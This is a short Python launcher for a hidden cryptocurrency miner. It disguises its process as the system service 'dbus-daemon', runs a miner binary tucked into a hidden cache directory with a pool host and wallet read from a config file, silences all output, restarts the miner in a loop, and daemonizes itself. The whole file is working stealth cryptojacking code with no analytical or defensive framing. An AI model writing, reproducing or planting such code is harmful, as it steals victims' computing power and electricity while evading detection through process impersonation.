import subprocess
import os
import sys
import time
from setproctitle import setproctitle

def load_config(filename="data.txt"):
    config = {}
    with open(filename, "r") as f:
        for line in f:
            if "=" in line:
                key, val = line.strip().split("=", 1)
                config[key.strip()] = val.strip()
    return config

def main():
    setproctitle("dbus-daemon")
    binary_path = "/usr/local/.cache/dbus-daemon"

    if not os.path.isfile(binary_path):
        sys.exit(0)

    cfg = load_config()
    args = [
        binary_path,
        "-a", cfg.get("algorithm", "power2b"),
        "-o", cfg.get("host", ""),
        "-u", cfg.get("wallet", ""),
        "-p", cfg.get("password", "x"),
        "-t", cfg.get("threads", "1")
    ]

    while True:
        subprocess.run(args, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
        time.sleep(3)

if __name__ == "__main__":
    pid = os.fork()
    if pid > 0:
        sys.exit(0)
    os.setsid()
    main()
